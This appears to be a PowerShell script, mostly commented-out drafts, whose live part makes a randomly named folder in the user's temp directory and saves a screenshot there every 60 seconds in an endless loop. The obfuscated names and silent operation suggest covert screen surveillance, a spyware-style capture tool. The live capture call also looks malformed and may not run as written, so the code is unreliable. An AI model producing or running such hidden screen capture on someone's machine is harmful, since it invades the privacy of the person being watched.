# [void]
# [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
# [void] 
# [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

# $path="$env:temp\ASGHbvcQPW"
# mkdir $path
# Set-Location $path


# function tsdhhRJcuc
# {

#     param(
#     [Switch]$OfWindow
#     )

#     begin {

#         Add-Type -AssemblyName System.Drawing ,System.Windows.Forms
#         $jpegCodec=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | where-Object {$_.FormatDescription -eq "JPEG"}
        
#     }
 
        
#     process{
#         Start-Sleep -Milliseconds 250
#         if ($OfWindow) {
#             # $obj = new-object -ComObject WScript.Shell
#             # $obj.SendKeys("%{PrtSc}")
#             [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
#         } else {
#             # $obj = new-object -ComObject WScript.Shell
#             # $obj.SendKeys("%{PrtSc}")
#             [Windows.Forms.Sendkeys]::SendWait("^{PrtSc}")
#         }
#         Start-Sleep -Milliseconds 250
#         # $bitmap=[Windows.Forms.Clipboard]::GetImage()
#         $bitmap=New-Object Drawing.Bitmap
#         write-output "bitmap=$bitmap"
#         $ep=New-Object Drawing.Imaging.EncoderParameters
#         $ep.Param[0]=New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
#         $now = Get-Date -format "yyyy-MM-dd_HH-mm-ss"
#         $Screenpath = "$path\ScreenShot_${now}.jpg"
#         # $YwBKAucQTI="$pwd\NuTWJqSiHA"
#         # $HbxasjSYzC=0
#         # while (Test-Path -Path "${YwBKAucQTI}${HbxasjSYzC}.jpg"){
#         #     $HbxasjSYzC++
#         # }
#         write-output "path=$path"
#         write-output "ep=$ep"
#         write-output "Codec=$jpegCodec"
#         $bitmap.Save($Screenpath,$Codec,$ep)
#     }
# }
# while ($true){
#     tsdhhRJcuc
#     Start-Sleep -seconds 60
# }
[void]
[System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] 
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
$path="$env:temp/ASGHbvcQPW"

if (!(Test-Path -Path $path -PathType Container))
{
    New-Item -ItemType Directory -Path $path
    #mkdir $path
    Set-Location $path
}



# function tsdhhRJcuc
# {

#     param(
#     [Switch]$OfWindow
#     )

#     begin {

#         Add-Type -AssemblyName System.Drawing ,System.Windows.Forms
#         $jpegCodec=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | where-Object {$_.FormatDescription -eq "JPEG"}
        
#     }
 
        
#     process{
#         Start-Sleep -Milliseconds 250
#         if ($OfWindow) {
#             # $obj = new-object -ComObject WScript.Shell
#             # $obj.SendKeys("%{PrtSc}")
#             [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
#         } else {
#             # $obj = new-object -ComObject WScript.Shell
#             # $obj.SendKeys("%{PrtSc}")
#             [Windows.Forms.Sendkeys]::SendWait("^{PrtSc}")
#         }
#         Start-Sleep -Milliseconds 250
#         $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
#         $Width = $Screen.Width
#         $Height = $Screen.Height
#         $Left = $Screen.Left
#         $Top = $Screen.Top

#         $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
#         $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
#         $Graphics.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
#         $now = Get-Date -format "yyyy-MM-dd_HH-mm-ss"
#         $Screenpath = "$path\ScreenShot_${now}.jpg"
#         $Bitmap.Save("$Screenpath", [System.Drawing.Imaging.ImageFormat]::JPEG)
#         $Bitmap.Dispose()
#         # $bitmap=[Windows.Forms.Clipboard]::GetImage()
#         #$bitmap=New-Object Drawing.Bitmap
#         write-output "bitmap=$bitmap"
#         #ep=New-Object Drawing.Imaging.EncoderParameters
#         #$ep.Param[0]=New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)

#         # $YwBKAucQTI="$pwd\NuTWJqSiHA"
#         # $HbxasjSYzC=0
#         # while (Test-Path -Path "${YwBKAucQTI}${HbxasjSYzC}.jpg"){
#         #     $HbxasjSYzC++
#         # }
#         write-output "path=$path"
#         write-output "ep=$ep"
#         write-output "Codec=$jpegCodec"
#         #$bitmap.Save($Screenpath,$Codec,$ep)
#     }
# }

[void]
[System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] 
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
while ($true){
    try{
    $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList 300,300
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,$bmp.Size)
    $now = Get-Date -format "yyyy-MM-dd_HH-mm-ss"
    $Screenpath = "$path\ScreenShot_${now}.jpg"
    $bmp.Save("${Screenpath}")
    # tsdhhRJcuc
    Start-Sleep -seconds 60
    }
    catch [Win32Exception]{

"Unable to solve it"
    }
}